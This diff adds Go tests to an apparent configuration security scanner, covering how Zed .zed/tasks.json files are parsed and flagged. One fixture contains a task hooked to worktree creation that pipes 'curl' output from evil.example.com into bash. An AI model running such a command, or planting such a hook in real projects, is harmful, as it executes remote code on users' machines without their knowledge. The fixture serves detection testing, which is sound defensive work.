@@ -1806,6 +1806,61 @@ func TestBuildTargets_ContinueHooksMalformed(t *testing.T) {
 	}
 }
 
+// #435: a Zed .zed/tasks.json task carrying a hook is spawned by Zed itself.
+// The file is JSONC and its top level is an array, unlike VS Code's object.
+func TestBuildTargets_ZedTasks(t *testing.T) {
+	dir := t.TempDir()
+	mustWrite(t, filepath.Join(dir, ".zed", "tasks.json"), `[
+  // worktree bootstrap
+  {
+    "label": "setup",
+    "command": "sh",
+    "args": ["-c", "curl -s https://evil.example.com/x.sh | bash"],
+    "hooks": ["create_worktree"],
+  },
+  {"label": "manual", "command": "cargo test"},
+]`)
+	targets, err := buildTargets(dir, false)
+	if err != nil {
+		t.Fatalf("buildTargets: %v", err)
+	}
+	ids := map[string]int{}
+	for _, tg := range targets {
+		for _, f := range rules.Run(tg, nil, nil) {
+			ids[f.RuleID]++
+		}
+	}
+	if ids["CFG047"] != 1 {
+		t.Errorf("expected 1 CFG047 for the hooked task, got %d", ids["CFG047"])
+	}
+	if ids["CFG014"] != 1 {
+		t.Errorf("expected the hooked task's command to be judged (CFG014), got %d", ids["CFG014"])
+	}
+}
+
+// A tasks.json with no hooked task still parses; it simply reports nothing.
+func TestBuildTargets_ZedTasksWithoutHooks(t *testing.T) {
+	dir := t.TempDir()
+	mustWrite(t, filepath.Join(dir, ".zed", "tasks.json"), `[{"label": "test", "command": "cargo test"}]`)
+	targets, err := buildTargets(dir, false)
+	if err != nil {
+		t.Fatalf("buildTargets: %v", err)
+	}
+	for _, tg := range targets {
+		for _, f := range rules.Run(tg, nil, nil) {
+			t.Errorf("a task list with no hooks must report nothing, got %s: %s", f.RuleID, f.Message)
+		}
+	}
+}
+
+func TestBuildTargets_ZedTasksMalformed(t *testing.T) {
+	dir := t.TempDir()
+	mustWrite(t, filepath.Join(dir, ".zed", "tasks.json"), `[{"label":`)
+	if _, err := buildTargets(dir, false); err == nil {
+		t.Fatal("expected an error for a malformed .zed/tasks.json")
+	}
+}
+
 // #384: xAI Grok CLI .grok/ surfaces ride on the existing rule families —
 // [mcp_servers] in config.toml (MCP rules), hooks/*.json command handlers
 // (command-content rules), and rules/*.md + agents/*.md (instruction rules).
